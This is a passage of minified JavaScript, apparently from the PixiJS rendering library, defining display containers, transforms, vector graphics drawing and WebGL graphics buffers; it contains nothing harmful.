e=this.getLocalBounds().height;this.scale.y=0!==e?t/e:1,this._height=t}}}),i.prototype.addChild=function(t){return this.addChildAt(t,this.children.length)},i.prototype.addChildAt=function(t,e){if(t===this)return t;if(e>=0&&e<=this.children.length)return t.parent&&t.parent.removeChild(t),t.parent=this,this.children.splice(e,0,t),t.emit("added",this),t;throw new Error(t+"addChildAt: The index "+e+" supplied is out of bounds "+this.children.length)},i.prototype.swapChildren=function(t,e){if(t!==e){var r=this.getChildIndex(t),i=this.getChildIndex(e);if(0>r||0>i)throw new Error("swapChildren: Both the supplied DisplayObjects must be children of the caller.");this.children[r]=e,this.children[i]=t}},i.prototype.getChildIndex=function(t){var e=this.children.indexOf(t);if(-1===e)throw new Error("The supplied DisplayObject must be a child of the caller");return e},i.prototype.setChildIndex=function(t,e){if(0>e||e>=this.children.length)throw new Error("The supplied index is out of bounds");var r=this.getChildIndex(t);this.children.splice(r,1),this.children.splice(e,0,t)},i.prototype.getChildAt=function(t){if(0>t||t>=this.children.length)throw new Error("getChildAt: Supplied index "+t+" does not exist in the child list, or the supplied DisplayObject is not a child of the caller");return this.children[t]},i.prototype.removeChild=function(t){var e=this.children.indexOf(t);return-1!==e?this.removeChildAt(e):void 0},i.prototype.removeChildAt=function(t){var e=this.getChildAt(t);return e.parent=null,this.children.splice(t,1),e.emit("removed",this),e},i.prototype.removeChildren=function(t,e){var r=t||0,i="number"==typeof e?e:this.children.length,n=i-r;if(n>0&&i>=n){for(var o=this.children.splice(r,n),s=0;s<o.length;++s)o[s].parent=null;return o}if(0===n&&0===this.children.length)return[];throw new RangeError("removeChildren: numeric values are outside the acceptable range.")},i.prototype.generateTexture=function(t,e,r){var i=this.getLocalBounds(),n=new s(t,0|i.width,0|i.height,r,e);return a.tx=-i.x,a.ty=-i.y,n.render(this,a),n},i.prototype.updateTransform=function(){
if(this.visible){this.displayObjectUpdateTransform();for(var t=0,e=this.children.length;e>t;++t)this.children[t].updateTransform()}},i.prototype.containerUpdateTransform=i.prototype.updateTransform,i.prototype.getBounds=function(){if(!this._currentBounds){if(0===this.children.length)return n.Rectangle.EMPTY;for(var t,e,r,i=1/0,o=1/0,s=-(1/0),a=-(1/0),h=!1,l=0,u=this.children.length;u>l;++l){var c=this.children[l];c.visible&&(h=!0,t=this.children[l].getBounds(),i=i<t.x?i:t.x,o=o<t.y?o:t.y,e=t.width+t.x,r=t.height+t.y,s=s>e?s:e,a=a>r?a:r)}if(!h)return n.Rectangle.EMPTY;var p=this._bounds;p.x=i,p.y=o,p.width=s-i,p.height=a-o,this._currentBounds=p}return this._currentBounds},i.prototype.containerGetBounds=i.prototype.getBounds,i.prototype.getLocalBounds=function(){var t=this.worldTransform;this.worldTransform=n.Matrix.IDENTITY;for(var e=0,r=this.children.length;r>e;++e)this.children[e].updateTransform();return this.worldTransform=t,this._currentBounds=null,this.getBounds(n.Matrix.IDENTITY)},i.prototype.renderWebGL=function(t){if(this.visible&&!(this.worldAlpha<=0)&&this.renderable){var e,r;if(this._mask||this._filters){for(t.currentRenderer.flush(),this._filters&&t.filterManager.pushFilter(this,this._filters),this._mask&&t.maskManager.pushMask(this,this._mask),t.currentRenderer.start(),this._renderWebGL(t),e=0,r=this.children.length;r>e;e++)this.children[e].renderWebGL(t);t.currentRenderer.flush(),this._mask&&t.maskManager.popMask(this,this._mask),this._filters&&t.filterManager.popFilter(),t.currentRenderer.start()}else for(this._renderWebGL(t),e=0,r=this.children.length;r>e;++e)this.children[e].renderWebGL(t)}},i.prototype._renderWebGL=function(t){},i.prototype._renderCanvas=function(t){},i.prototype.renderCanvas=function(t){if(this.visible&&!(this.alpha<=0)&&this.renderable){this._mask&&t.maskManager.pushMask(this._mask,t),this._renderCanvas(t);for(var e=0,r=this.children.length;r>e;++e)this.children[e].renderCanvas(t);this._mask&&t.maskManager.popMask(t)}},i.prototype.destroy=function(t){if(o.prototype.destroy.call(this),t)for(var e=0,r=this.children.length;r>e;++e)this.children[e].destroy(t);this.removeChildren(),this.children=null}},{"../math":32,"../textures/RenderTexture":70,"./DisplayObject":24}],24:[function(t,e,r){function i(){s.call(this),this.position=new n.Point,this.scale=new n.Point(1,1),this.pivot=new n.Point(0,0),this.rotation=0,this.alpha=1,this.visible=!0,this.renderable=!0,this.parent=null,this.worldAlpha=1,this.worldTransform=new n.Matrix,this.filterArea=null,this._sr=0,this._cr=1,this._bounds=new n.Rectangle(0,0,1,1),this._currentBounds=null,this._mask=null,this._cacheAsBitmap=!1,this._cachedObject=null}var n=t("../math"),o=t("../textures/RenderTexture"),s=t("eventemitter3"),a=t("../const"),h=new n.Matrix;i.prototype=Object.create(s.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{x:{get:function(){return this.position.x},set:function(t){this.position.x=t}},y:{get:function(){return this.position.y},set:function(t){this.position.y=t}},worldVisible:{get:function(){var t=this;do{if(!t.visible)return!1;t=t.parent}while(t);return!0}},mask:{get:function(){return this._mask},set:function(t){this._mask&&(this._mask.renderable=!0),this._mask=t,this._mask&&(this._mask.renderable=!1)}},filters:{get:function(){return this._filters&&this._filters.slice()},set:function(t){this._filters=t&&t.slice()}}}),i.prototype.updateTransform=function(){var t,e,r,i,n,o,s=this.parent.worldTransform,h=this.worldTransform;this.rotation%a.PI_2?(this.rotation!==this.rotationCache&&(this.rotationCache=this.rotation,this._sr=Math.sin(this.rotation),this._cr=Math.cos(this.rotation)),t=this._cr*this.scale.x,e=this._sr*this.scale.x,r=-this._sr*this.scale.y,i=this._cr*this.scale.y,n=this.position.x,o=this.position.y,(this.pivot.x||this.pivot.y)&&(n-=this.pivot.x*t+this.pivot.y*r,o-=this.pivot.x*e+this.pivot.y*i),h.a=t*s.a+e*s.c,h.b=t*s.b+e*s.d,h.c=r*s.a+i*s.c,h.d=r*s.b+i*s.d,h.tx=n*s.a+o*s.c+s.tx,h.ty=n*s.b+o*s.d+s.ty):(t=this.scale.x,i=this.scale.y,n=this.position.x-this.pivot.x*t,o=this.position.y-this.pivot.y*i,h.a=t*s.a,h.b=t*s.b,h.c=i*s.c,h.d=i*s.d,h.tx=n*s.a+o*s.c+s.tx,h.ty=n*s.b+o*s.d+s.ty),this.worldAlpha=this.alpha*this.parent.worldAlpha,this._currentBounds=null},i.prototype.displayObjectUpdateTransform=i.prototype.updateTransform,i.prototype.getBounds=function(t){return n.Rectangle.EMPTY},i.prototype.getLocalBounds=function(){return this.getBounds(n.Matrix.IDENTITY)},i.prototype.toGlobal=function(t){return this.displayObjectUpdateTransform(),this.worldTransform.apply(t)},i.prototype.toLocal=function(t,e){return e&&(t=e.toGlobal(t)),this.displayObjectUpdateTransform(),this.worldTransform.applyInverse(t)},i.prototype.renderWebGL=function(t){},i.prototype.renderCanvas=function(t){},i.prototype.generateTexture=function(t,e,r){var i=this.getLocalBounds(),n=new o(t,0|i.width,0|i.height,e,r);return h.tx=-i.x,h.ty=-i.y,n.render(this,h),n},i.prototype.destroy=function(){this.position=null,this.scale=null,this.pivot=null,this.parent=null,this._bounds=null,this._currentBounds=null,this._mask=null,this.worldTransform=null,this.filterArea=null}},{"../const":22,"../math":32,"../textures/RenderTexture":70,eventemitter3:11}],25:[function(t,e,r){function i(){n.call(this),this.fillAlpha=1,this.lineWidth=0,this.lineColor=0,this.graphicsData=[],this.tint=16777215,this._prevTint=16777215,this.blendMode=u.BLEND_MODES.NORMAL,this.currentPath=null,this._webGL={},this.isMask=!1,this.boundsPadding=0,this._localBounds=new l.Rectangle(0,0,1,1),this.dirty=!0,this.glDirty=!1,this.boundsDirty=!0,this.cachedSpriteDirty=!1}var n=t("../display/Container"),o=t("../textures/Texture"),s=t("../renderers/canvas/utils/CanvasBuffer"),a=t("../renderers/canvas/utils/CanvasGraphics"),h=t("./GraphicsData"),l=t("../math"),u=t("../const"),c=new l.Point;i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{}),i.prototype.clone=function(){var t=new i;t.renderable=this.renderable,t.fillAlpha=this.fillAlpha,t.lineWidth=this.lineWidth,t.lineColor=this.lineColor,t.tint=this.tint,t.blendMode=this.blendMode,t.isMask=this.isMask,t.boundsPadding=this.boundsPadding,t.dirty=this.dirty,t.glDirty=this.glDirty,t.cachedSpriteDirty=this.cachedSpriteDirty;for(var e=0;e<this.graphicsData.length;++e)t.graphicsData.push(this.graphicsData[e].clone());return t.currentPath=t.graphicsData[t.graphicsData.length-1],t.updateLocalBounds(),t},i.prototype.lineStyle=function(t,e,r){return this.lineWidth=t||0,this.lineColor=e||0,this.lineAlpha=void 0===r?1:r,this.currentPath&&(this.currentPath.shape.points.length?this.drawShape(new l.Polygon(this.currentPath.shape.points.slice(-2))):(this.currentPath.lineWidth=this.lineWidth,this.currentPath.lineColor=this.lineColor,this.currentPath.lineAlpha=this.lineAlpha)),this},i.prototype.moveTo=function(t,e){return this.drawShape(new l.Polygon([t,e])),this},i.prototype.lineTo=function(t,e){return this.currentPath.shape.points.push(t,e),this.dirty=!0,this},i.prototype.quadraticCurveTo=function(t,e,r,i){this.currentPath?0===this.currentPath.shape.points.length&&(this.currentPath.shape.points=[0,0]):this.moveTo(0,0);var n,o,s=20,a=this.currentPath.shape.points;0===a.length&&this.moveTo(0,0);for(var h=a[a.length-2],l=a[a.length-1],u=0,c=1;s>=c;++c)u=c/s,n=h+(t-h)*u,o=l+(e-l)*u,a.push(n+(t+(r-t)*u-n)*u,o+(e+(i-e)*u-o)*u);return this.dirty=this.boundsDirty=!0,this},i.prototype.bezierCurveTo=function(t,e,r,i,n,o){this.currentPath?0===this.currentPath.shape.points.length&&(this.currentPath.shape.points=[0,0]):this.moveTo(0,0);for(var s,a,h,l,u,c=20,p=this.currentPath.shape.points,d=p[p.length-2],f=p[p.length-1],v=0,g=1;c>=g;++g)v=g/c,s=1-v,a=s*s,h=a*s,l=v*v,u=l*v,p.push(h*d+3*a*v*t+3*s*l*r+u*n,h*f+3*a*v*e+3*s*l*i+u*o);return this.dirty=this.boundsDirty=!0,this},i.prototype.arcTo=function(t,e,r,i,n){this.currentPath?0===this.currentPath.shape.points.length&&this.currentPath.shape.points.push(t,e):this.moveTo(t,e);var o=this.currentPath.shape.points,s=o[o.length-2],a=o[o.length-1],h=a-e,l=s-t,u=i-e,c=r-t,p=Math.abs(h*c-l*u);if(1e-8>p||0===n)(o[o.length-2]!==t||o[o.length-1]!==e)&&o.push(t,e);else{var d=h*h+l*l,f=u*u+c*c,v=h*u+l*c,g=n*Math.sqrt(d)/p,m=n*Math.sqrt(f)/p,y=g*v/d,x=m*v/f,b=g*c+m*l,_=g*u+m*h,T=l*(m+y),E=h*(m+y),S=c*(g+x),A=u*(g+x),w=Math.atan2(E-_,T-b),C=Math.atan2(A-_,S-b);this.arc(b+t,_+e,n,w,C,l*u>c*h)}return this.dirty=this.boundsDirty=!0,this},i.prototype.arc=function(t,e,r,i,n,o){if(o=o||!1,i===n)return this;!o&&i>=n?n+=2*Math.PI:o&&n>=i&&(i+=2*Math.PI);var s=o?-1*(i-n):n-i,a=40*Math.ceil(Math.abs(s)/(2*Math.PI));if(0===s)return this;var h=t+Math.cos(i)*r,l=e+Math.sin(i)*r;this.currentPath?o&&this.filling?this.currentPath.shape.points.push(t,e):this.currentPath.shape.points.push(h,l):o&&this.filling?this.moveTo(t,e):this.moveTo(h,l);for(var u=this.currentPath.shape.points,c=s/(2*a),p=2*c,d=Math.cos(c),f=Math.sin(c),v=a-1,g=v%1/v,m=0;v>=m;m++){var y=m+g*m,x=c+i+p*y,b=Math.cos(x),_=-Math.sin(x);u.push((d*b+f*_)*r+t,(d*-_+f*b)*r+e)}return this.dirty=this.boundsDirty=!0,this},i.prototype.beginFill=function(t,e){return this.filling=!0,this.fillColor=t||0,this.fillAlpha=void 0===e?1:e,this.currentPath&&this.currentPath.shape.points.length<=2&&(this.currentPath.fill=this.filling,this.currentPath.fillColor=this.fillColor,this.currentPath.fillAlpha=this.fillAlpha),this},i.prototype.endFill=function(){return this.filling=!1,this.fillColor=null,this.fillAlpha=1,this},i.prototype.drawRect=function(t,e,r,i){return this.drawShape(new l.Rectangle(t,e,r,i)),this},i.prototype.drawRoundedRect=function(t,e,r,i,n){return this.drawShape(new l.RoundedRectangle(t,e,r,i,n)),this},i.prototype.drawCircle=function(t,e,r){return this.drawShape(new l.Circle(t,e,r)),this},i.prototype.drawEllipse=function(t,e,r,i){return this.drawShape(new l.Ellipse(t,e,r,i)),this},i.prototype.drawPolygon=function(t){var e=t;if(!Array.isArray(e)){e=new Array(arguments.length);for(var r=0;r<e.length;++r)e[r]=arguments[r]}return this.drawShape(new l.Polygon(e)),this},i.prototype.clear=function(){return this.lineWidth=0,this.filling=!1,this.dirty=!0,this.clearDirty=!0,this.graphicsData=[],this},i.prototype.generateTexture=function(t,e,r){e=e||1;var i=this.getLocalBounds(),n=new s(i.width*e,i.height*e),h=o.fromCanvas(n.canvas,r);return h.baseTexture.resolution=e,n.context.scale(e,e),n.context.translate(-i.x,-i.y),a.renderGraphics(this,n.context),h},i.prototype._renderWebGL=function(t){this.glDirty&&(this.dirty=!0,this.glDirty=!1),t.setObjectRenderer(t.plugins.graphics),t.plugins.graphics.render(this)},i.prototype._renderCanvas=function(t){if(this.isMask!==!0){this._prevTint!==this.tint&&(this.dirty=!0,this._prevTint=this.tint);var e=t.context,r=this.worldTransform;this.blendMode!==t.currentBlendMode&&(t.currentBlendMode=this.blendMode,e.globalCompositeOperation=t.blendModes[t.currentBlendMode]);var i=t.resolution;e.setTransform(r.a*i,r.b*i,r.c*i,r.d*i,r.tx*i,r.ty*i),a.renderGraphics(this,e)}},i.prototype.getBounds=function(t){if(!this._currentBounds){if(!this.renderable)return l.Rectangle.EMPTY;this.boundsDirty&&(this.updateLocalBounds(),this.glDirty=!0,this.cachedSpriteDirty=!0,this.boundsDirty=!1);var e=this._localBounds,r=e.x,i=e.width+e.x,n=e.y,o=e.height+e.y,s=t||this.worldTransform,a=s.a,h=s.b,u=s.c,c=s.d,p=s.tx,d=s.ty,f=a*i+u*o+p,v=c*o+h*i+d,g=a*r+u*o+p,m=c*o+h*r+d,y=a*r+u*n+p,x=c*n+h*r+d,b=a*i+u*n+p,_=c*n+h*i+d,T=f,E=v,S=f,A=v;S=S>g?g:S,S=S>y?y:S,S=S>b?b:S,A=A>m?m:A,A=A>x?x:A,A=A>_?_:A,T=g>T?g:T,T=y>T?y:T,T=b>T?b:T,E=m>E?m:E,E=x>E?x:E,E=_>E?_:E,this._bounds.x=S,this._bounds.width=T-S,this._bounds.y=A,this._bounds.height=E-A,this._currentBounds=this._bounds}return this._currentBounds},i.prototype.containsPoint=function(t){this.worldTransform.applyInverse(t,c);for(var e=this.graphicsData,r=0;r<e.length;r++){var i=e[r];if(i.fill&&i.shape&&i.shape.contains(c.x,c.y))return!0}return!1},i.prototype.updateLocalBounds=function(){var t=1/0,e=-(1/0),r=1/0,i=-(1/0);if(this.graphicsData.length)for(var n,o,s,a,h,l,c=0;c<this.graphicsData.length;c++){var p=this.graphicsData[c],d=p.type,f=p.lineWidth;if(n=p.shape,d===u.SHAPES.RECT||d===u.SHAPES.RREC)s=n.x-f/2,a=n.y-f/2,h=n.width+f,l=n.height+f,t=t>s?s:t,e=s+h>e?s+h:e,r=r>a?a:r,i=a+l>i?a+l:i;else if(d===u.SHAPES.CIRC)s=n.x,a=n.y,h=n.radius+f/2,l=n.radius+f/2,t=t>s-h?s-h:t,e=s+h>e?s+h:e,r=r>a-l?a-l:r,i=a+l>i?a+l:i;else if(d===u.SHAPES.ELIP)s=n.x,a=n.y,h=n.width+f/2,l=n.height+f/2,t=t>s-h?s-h:t,e=s+h>e?s+h:e,r=r>a-l?a-l:r,i=a+l>i?a+l:i;else{o=n.points;for(var v=0;v<o.length;v+=2)s=o[v],a=o[v+1],t=t>s-f?s-f:t,e=s+f>e?s+f:e,r=r>a-f?a-f:r,i=a+f>i?a+f:i}}else t=0,e=0,r=0,i=0;var g=this.boundsPadding;this._localBounds.x=t-g,this._localBounds.width=e-t+2*g,this._localBounds.y=r-g,this._localBounds.height=i-r+2*g},i.prototype.drawShape=function(t){this.currentPath&&this.currentPath.shape.points.length<=2&&this.graphicsData.pop(),this.currentPath=null;var e=new h(this.lineWidth,this.lineColor,this.lineAlpha,this.fillColor,this.fillAlpha,this.filling,t);return this.graphicsData.push(e),e.type===u.SHAPES.POLY&&(e.shape.closed=e.shape.closed||this.filling,this.currentPath=e),this.dirty=this.boundsDirty=!0,e},i.prototype.destroy=function(){n.prototype.destroy.apply(this,arguments);for(var t=0;t<this.graphicsData.length;++t)this.graphicsData[t].destroy();for(var e in this._webgl)for(var r=0;r<this._webgl[e].data.length;++r)this._webgl[e].data[r].destroy();this.graphicsData=null,this.currentPath=null,this._webgl=null,this._localBounds=null}},{"../const":22,"../display/Container":23,"../math":32,"../renderers/canvas/utils/CanvasBuffer":44,"../renderers/canvas/utils/CanvasGraphics":45,"../textures/Texture":71,"./GraphicsData":26}],26:[function(t,e,r){function i(t,e,r,i,n,o,s){this.lineWidth=t,this.lineColor=e,this.lineAlpha=r,this._lineTint=e,this.fillColor=i,this.fillAlpha=n,this._fillTint=i,this.fill=o,this.shape=s,this.type=s.type}i.prototype.constructor=i,e.exports=i,i.prototype.clone=function(){return new i(this.lineWidth,this.lineColor,this.lineAlpha,this.fillColor,this.fillAlpha,this.fill,this.shape)},i.prototype.destroy=function(){this.shape=null}},{}],27:[function(t,e,r){function i(t){a.call(this,t),this.graphicsDataPool=[],this.primitiveShader=null,this.complexPrimitiveShader=null,this.maximumSimplePolySize=200}var n=t("../../utils"),o=t("../../math"),s=t("../../const"),a=t("../../renderers/webgl/utils/ObjectRenderer"),h=t("../../renderers/webgl/WebGLRenderer"),l=t("./WebGLGraphicsData"),u=t("earcut");i.prototype=Object.create(a.prototype),i.prototype.constructor=i,e.exports=i,h.registerPlugin("graphics",i),i.prototype.onContextChange=function(){},i.prototype.destroy=function(){a.prototype.destroy.call(this);for(var t=0;t<this.graphicsDataPool.length;++t)this.graphicsDataPool[t].destroy();this.graphicsDataPool=null},i.prototype.render=function(t){var e,r=this.renderer,i=r.gl,o=r.shaderManager.plugins.primitiveShader;t.dirty&&this.updateGraphics(t,i);var s=t._webGL[i.id];r.blendModeManager.setBlendMode(t.blendMode);for(var a=0;a<s.data.length;a++)1===s.data[a].mode?(e=s.data[a],r.stencilManager.pushStencil(t,e,r),i.uniform1f(r.shaderManager.complexPrimitiveShader.uniforms.alpha._location,t.worldAlpha*e.alpha),i.drawElements(i.TRIANGLE_FAN,4,i.UNSIGNED_SHORT,2*(e.indices.length-4)),r.stencilManager.popStencil(t,e,r)):(e=s.data[a],o=r.shaderManager.primitiveShader,r.shaderManager.setShader(o),i.uniformMatrix3fv(o.uniforms.translationMatrix._location,!1,t.worldTransform.toArray(!0)),i.uniformMatrix3fv(o.uniforms.projectionMatrix._location,!1,r.currentRenderTarget.projectionMatrix.toArray(!0)),i.uniform3fv(o.uniforms.tint._location,n.hex2rgb(t.tint)),i.uniform1f(o.uniforms.alpha._location,t.worldAlpha),i.bindBuffer(i.ARRAY_BUFFER,e.buffer),i.vertexAttribPointer(o.attributes.aVertexPosition,2,i.FLOAT,!1,24,0),i.vertexAttribPointer(o.attributes.aColor,4,i.FLOAT,!1,24,8),i.bindBuffer(i.ELEMENT_ARRAY_BUFFER,e.indexBuffer),i.drawElements(i.TRIANGLE_STRIP,e.indices.length,i.UNSIGNED_SHORT,0))},i.prototype.updateGraphics=function(t){var e=this.renderer.gl,r=t._webGL[e.id];r||(r=t._webGL[e.id]={lastIndex:0,data:[],gl:e}),t.dirty=!1;var i;if(t.clearDirty){for(t.clearDirty=!1,i=0;i<r.data.length;i++){var n=r.data[i];n.reset(),this.graphicsDataPool.push(n)}r.data=[],r.lastIndex=0}var o;for(i=r.lastIndex;i<t.graphicsData.length;i++){var a=t.graphicsData[i];if(a.type===s.SHAPES.POLY){if(a.points=a.shape.points.slice(),a.shape.closed&&(a.points[0]!==a.points[a.points.length-2]||a.points[1]!==a.points[a.points.length-1])&&a.points.push(a.points[0],a.points[1]),a.fill&&a.points.length>=6)if(a.points.length<2*this.maximumSimplePolySize){o=this.switchMode(r,0);var h=this.buildPoly(a,o);h||(o=this.switchMode(r,1),this.buildComplexPoly(a,o))}else o=this.switchMode(r,1),this.buildComplexPoly(a,o);a.lineWidth>0&&(o=this.switchMode(r,0),this.buildLine(a,o))}else o=this.switchMode(r,0),a.type===s.SHAPES.RECT?this.buildRectangle(a,o):a.type===s.SHAPES.CIRC||a.type===s.SHAPES.ELIP?this.buildCircle(a,o):a.type===s.SHAPES.RREC&&this.buildRoundedRectangle(a,o);r.lastIndex++}for(i=0;i<r.data.length;i++)o=r.data[i],o.dirty&&o.upload()},i.prototype.switchMode=function(t,e){var r;return t.data.length?(r=t.data[t.data.length-1],(r.points.length>32e4||r.mode!==e||1===e)&&(r=this.graphicsDataPool.pop()||new l(t.gl),r.mode=e,t.data.push(r))):(r=this.graphicsDataPool.pop()||new l(t.gl),r.mode=e,t.data.push(r)),r.dirty=!0,r},i.prototype.buildRectangle=function(t,e){var r=t.shape,i=r.x,o=r.y,s=r.width,a=r.height;if(t.fill){var h=n.hex2rgb(t.fillColor),l=t.fillAlpha,u=h[0]*l,c=h[1]*l,p=h[2]*l,d=e.points,f=e.indices,v=d.length/6;d.push(i,o),d.push(u,c,p,l),d.push(i+s,o),d.push(u,c,p,l),d.push(i,o+a),d.push(u,c,p,l),d.push(i+s,o+a),d.push(u,c,p,l),f.push(v,v,v+1,v+2,v+3,v+3)}if(t.lineWidth){var g=t.points;t.points=[i,o,i+s,o,i+s,o+a,i,o+a,i,o],this.buildLine(t,e),t.points=g}},i.prototype.buildRoundedRectangle=function(t,e){var r=t.shape,i=r.x,o=r.y,s=r.width,a=r.height,h=r.radius,l=[];if(l.push(i,o+h),this.quadraticBezierCurve(i,o+a-h,i,o+a,i+h,o+a,l),this.quadraticBezierCurve(i+s-h,o+a,i+s,o+a,i+s,o+a-h,l),this.quadraticBezierCurve(i+s,o+h,i+s,o,i+s-h,o,l),this.quadraticBezierCurve(i+h,o,i,o,i,o+h+1e-10,l),t.fill){var c=n.hex2rgb(t.fillColor),p=t.fillAlpha,d=c[0]*p,f=c[1]*p,v=c[2]*p,g=e.points,m=e.indices,y=g.length/6,x=u(l,null,2),b=0;for(b=0;b<x.length;b+=3)m.push(x[b]+y),m.push(x[b]+y),m.push(x[b+1]+y),m.push(x[b+2]+y),m.push(x[b+2]+y);for(b=0;b<l.length;b++)g.push(l[b],l[++b],d,f,v,p)}if(t.lineWidth){var _=t.points;t.points=l,this.buildLine(t,e),t.points=_}},i.prototype.quadraticBezierCurve=function(t,e,r,i,n,o,s){function a(t,e,r){var i=e-t;return t+i*r}for(var h,l,u,c,p,d,f=20,v=s||[],g=0,m=0;f>=m;m++)g=m/f,h=a(t,r,g),l=a(e,i,g),u=a(r,n,g),c=a(i,o,g),p=a(h,u,g),d=a(l,c,g),v.push(p,d);return v},i.prototype.buildCircle=function(t,e){var r,i,o=t.shape,a=o.x,h=o.y;t.type===s.SHAPES.CIRC?(r=o.radius,i=o.radius):(r=o.width,i=o.height);var l=40,u=2*Math.PI/l,c=0;if(t.fill){var p=n.hex2rgb(t.fillColor),d=t.fillAlpha,f=p[0]*d,v=p[1]*d,g=p[2]*d,m=e.points,y=e.indices,x=m.length/6;for(y.push(x),c=0;l+1>c;c++)m.push(a,h,f,v,g,d),m.push(a+Math.sin(u*c)*r,h+Math.cos(u*c)*i,f,v,g,d),y.push(x++,x++);y.push(x-1)}if(t.lineWidth){var b=t.points;for(t.points=[],c=0;l+1>c;c++)t.points.push(a+Math.sin(u*c)*r,h+Math.cos(u*c)*i);this.buildLine(t,e),t.points=b}},i.prototype.buildLine=function(t,e){var r=0,i=t.points;if(0!==i.length){if(t.lineWidth%2)for(r=0;r<i.length;r++)i[r]+=.5;var s=new o.Point(i[0],i[1]),a=new o.Point(i[i.length-2],i[i.length-1]);if(s.x===a.x&&s.y===a.y){i=i.slice(),i.pop(),i.pop(),a=new o.Point(i[i.length-2],i[i.length-1]);var h=a.x+.5*(s.x-a.x),l=a.y+.5*(s.y-a.y);i.unshift(h,l),i.push(h,l)}var u,c,p,d,f,v,g,m,y,x,b,_,T,E,S,A,w,C,M,R,D,F,P,O=e.points,B=e.indices,L=i.length/2,I=i.length,N=O.length/6,U=t.lineWidth/2,k=n.hex2rgb(t.lineColor),j=t.lineAlpha,X=k[0]*j,G=k[1]*j,Y=k[2]*j;for(p=i[0],d=i[1],f=i[2],v=i[3],y=-(d-v),x=p-f,P=Math.sqrt(y*y+x*x),y/=P,x/=P,y*=U,x*=U,O.push(p-y,d-x,X,G,Y,j),O.push(p+y,d+x,X,G,Y,j),r=1;L-1>r;r++)p=i[2*(r-1)],d=i[2*(r-1)+1],f=i[2*r],v=i[2*r+1],g=i[2*(r+1)],m=i[2*(r+1)+1],y=-(d-v),x=p-f,P=Math.sqrt(y*y+x*x),y/=P,x/=P,y*=U,x*=U,b=-(v-m),_=f-g,P=Math.sqrt(b*b+_*_),b/=P,_/=P,b*=U,_*=U,S=-x+d-(-x+v),A=-y+f-(-y+p),w=(-y+p)*(-x+v)-(-y+f)*(-x+d),C=-_+m-(-_+v),M=-b+f-(-b+g),R=(-b+g)*(-_+v)-(-b+f)*(-_+m),D=S*M-C*A,Math.abs(D)<.1?(D+=10.1,O.push(f-y,v-x,X,G,Y,j),O.push(f+y,v+x,X,G,Y,j)):(u=(A*R-M*w)/D,c=(C*w-S*R)/D,F=(u-f)*(u-f)+(c-v)+(c-v),F>19600?(T=y-b,E=x-_,P=Math.sqrt(T*T+E*E),T/=P,E/=P,T*=U,E*=U,O.push(f-T,v-E),O.push(X,G,Y,j),O.push(f+T,v+E),O.push(X,G,Y,j),O.push(f-T,v-E),O.push(X,G,Y,j),I++):(O.push(u,c),O.push(X,G,Y,j),O.push(f-(u-f),v-(c-v)),O.push(X,G,Y,j)));for(p=i[2*(L-2)],d=i[2*(L-2)+1],f=i[2*(L-1)],v=i[2*(L-1)+1],y=-(d-v),x=p-f,P=Math.sqrt(y*y+x*x),y/=P,x/=P,y*=U,x*=U,O.push(f-y,v-x),O.push(X,G,Y,j),O.push(f+y,v+x),O.push(X,G,Y,j),B.push(N),r=0;I>r;r++)B.push(N++);B.push(N-1)}},i.prototype.buildComplexPoly=function(t,e){var r=t.points.slice();if(!(r.length<6)){var i=e.indices;e.points=r,e.alpha=t.fillAlpha,e.color=n.hex2rgb(t.fillColor);for(var o,s,a=1/0,h=-(1/0),l=1/0,u=-(1/0),c=0;c<r.length;c+=2)o=r[c],s=r[c+1],a=a>o?o:a,h=o>h?o:h,l=l>s?s:l,u=s>u?s:u;r.push(a,l,h,l,h,u,a,u);var p=r.length/2;for(c=0;p>c;c++)i.push(c)}},i.prototype.buildPoly=function(t,e){var r=t.points;if(!(r.length<6)){var i=e.points,o=e.indices,s=r.length/2,a=n.hex2rgb(t.fillColor),h=t.fillAlpha,l=a[0]*h,c=a[1]*h,p=a[2]*h,d=u(r,null,2);if(!d)return!1;var f=i.length/6,v=0;for(v=0;v<d.length;v+=3)o.push(d[v]+f),o.push(d[v]+f),o.push(d[v+1]+f),o.push(d[v+2]+f),o.push(d[v+2]+f);for(v=0;s>v;v++)i.push(r[2*v],r[2*v+1],l,c,p,h);return!0}}},{"../../const":22,"../../math":32,"../../renderers/webgl/WebGLRenderer":48,"../../renderers/webgl/utils/ObjectRenderer":62,"../../utils":76,"./WebGLGraphicsData":28,earcut:10}],28:[function(t,e,r){function i(t){this.gl=t,this.color=[0,0,0],this.points=[],this.indices=[],this.buffer=t.createBuffer(),this.indexBuffer=t.createBuffer(),this.mode=1,this.alpha=1,this.dirty=!0,this.glPoints=null,this.glIndices=null}i.prototype.constructor=i,e.exports=i,i.prototype.reset=function(){this.points.length=0,this.indices.length=0},i.prototype.upload=function(){var t=this.gl;this.glPoints=new Float32Array(this.points),t.bindBuffer(t.ARRAY_BUFFER,this.buffer),t.bufferData(t.ARRAY_BUFFER,this.glPoints,t.STATIC_DRAW),this.glIndices=new Uint16Array(this.indices),t.bindBuffer(t.ELEMENT_ARRAY_BUFFER,this.indexBuffer),t.bufferData(t.ELEMENT_ARRAY_BUFFER,this.glIndices,t.STATIC_DRAW),this.dirty=!1},i.prototype.destroy=function(){this.color=null,this.points=null,this.indices=null,this.gl.deleteBuffer(this.buffer),this.gl.deleteBuffer(this.indexBuffer),this.gl=null,this.buffer=null,this.indexBuffer=null,this.glPoints=null,this.glIndices=null}},{}],29:[function(t,e,r){var i=e.exports=Object.assign(t("./const"),t("./math"),{utils:t("./utils"),ticker:t("./ticker"),DisplayObject:t("./display/DisplayObject"),Container:t("./display/Container"),Sprite:t("./sprites/Sprite"),ParticleContainer:t("./particles/ParticleContainer"),SpriteRenderer:t("./sprites/webgl/SpriteRenderer"),ParticleRenderer:t("./particles/webgl/ParticleRenderer"),Text:t("./text/Text"),Graphics:t("./graphics/Graphics"),GraphicsData:t("./graphics/GraphicsData"),GraphicsRenderer:t("./graphics/webgl/GraphicsRenderer"),Texture:t("./textures/Texture"),BaseTexture:t("./textures/BaseTexture"),RenderTexture:t("./textures/RenderTexture"),VideoBaseTexture:t("./textures/VideoBaseTexture"),TextureUvs:t("./textures/TextureUvs"),CanvasRenderer:t("./renderers/canvas/CanvasRenderer"),CanvasGraphics:t("./renderers/canvas/utils/CanvasGraphics"),CanvasBuffer:t("./renderers/canvas/utils/CanvasBuffer"),WebGLRenderer:t("./renderers/webgl/WebGLRenderer"),ShaderManager:t("./renderers/webgl/managers/ShaderManager"),Shader:t("./renderers/webgl/shaders/Shader"